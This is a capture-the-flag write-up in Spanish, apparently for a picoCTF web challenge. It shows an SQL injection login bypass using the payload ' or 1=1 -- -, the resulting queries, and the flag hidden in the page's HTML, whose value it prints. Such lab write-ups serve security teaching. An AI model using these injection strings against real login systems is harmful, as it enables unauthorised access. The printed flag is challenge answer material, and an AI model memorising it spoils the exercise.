## Descripción
Can you login to this website?

Additional details will be available after launching your challenge instance.
## Solución
`1.` Si ingresamos como admin nos dan este contenido:
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

# Login failed.
```
`2.` Podemos hacer una inyección SQL pero si intentamos con la `' or 1=1;` nos devuelve la misma página
`3.` Si intentamos con esta variante `' or 1=1 -- -`
```
username: ' or 1=1 -- -
password: ' or 1=1 -- -
SQL query: SELECT * FROM users WHERE name='' or 1=1 -- -' AND password='' or 1=1 -- -'

# Logged in! But can you see the flag, it is in plainsight.
```
`4.` Podemos inspeccionar la página y en el html está la bandera
```html
<pre>username: &#039; or 1=1 -- -
password: &#039; or 1=1 -- -
SQL query: SELECT * FROM users WHERE name=&#039;&#039; or 1=1 -- -&#039; AND password=&#039;&#039; or 1=1 -- -&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>
```
## Notas adicionales
El `-- -` comenta todo lo que está después del `or 1=1`
## Referencias